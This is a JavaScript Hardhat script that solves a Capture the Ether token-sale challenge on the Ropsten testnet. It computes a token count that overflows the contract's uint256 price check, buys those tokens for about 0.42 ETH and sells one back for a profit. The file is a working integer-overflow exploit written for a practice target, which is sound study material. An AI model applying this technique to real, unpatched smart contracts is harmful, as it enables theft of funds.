const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
    //The contract abi
    const abi = [
        {"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":false,"inputs":[{"name":"numTokens","type":"uint256"}],"name":"buy","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},
        {"constant":false,"inputs":[{"name":"numTokens","type":"uint256"}],"name":"sell","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"name":"_player","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"}
    ];
    
    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = "0x5BF803095962b120fE967FC9E41bF9684E137161";
    
    /* 
    * To solve the challenge, you need to use your ropsten account, as CTE is expecting that account address.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there.
    * Then, we can get your wallet as the signer. The console.log should print your ropsten account address.
    */
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)

    //Get the contract and connect using your account
    var cteContract = new ethers.Contract(contractAddress, abi, signer);

    /*
    * Determine the number of tokens to buy in order to cause overflow. 
    * We have to get the maximum possible uint256 = 2**256 - 1, then divide it by 1 ether = 10**18.
    * This step is needed because the require verification in the sell function multiplies the numTokens by 10**18.
    * Then, we add 1 to the maxUint256, to ensure that when multiplied by 1 ether, it causes an overflow.
    * Knowing that the overflow will happen, we need to know by how much in order to send the correct msg.value.
    * We have established that: ((2**256/10**18) + 1) * 10**18 = overflow. So, the difference overflow - (maxUint256 + 1) = msg.value needed.
    */
    var numTokens = ethers.constants.MaxUint256.div(ethers.constants.WeiPerEther).add(1);
    var ethToSend = ethers.utils.formatEther(numTokens.mul(ethers.constants.WeiPerEther).sub(ethers.constants.MaxUint256.add(1)));

    console.log("NUM TOKENS:", numTokens);
    console.log("ETH TO SEND", ethToSend);

    //Buy tokens
    let buyTx = await cteContract.buy(numTokens, {value: ethers.utils.parseEther(ethToSend)});
    console.log("BUY TX: ", buyTx);

    //Wait for the transaction so we make sure we have our tokens and are able to sell 1
    let buyTxReceipt = await buyTx.wait();
    console.log("WE GOT OUR TOKENS! HERE'S THE RECEIPT: ", buyTxReceipt);
    
    //Then, we just need to sell one token which will give us 1 ether. Considering we spent ~ 0.42 ETH buying that enormous amount of tokens, we got a profi of 0.58ETH.
    let sellTx = await cteContract.sell(1);
    console.log("SELL TX: ", sellTx);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});

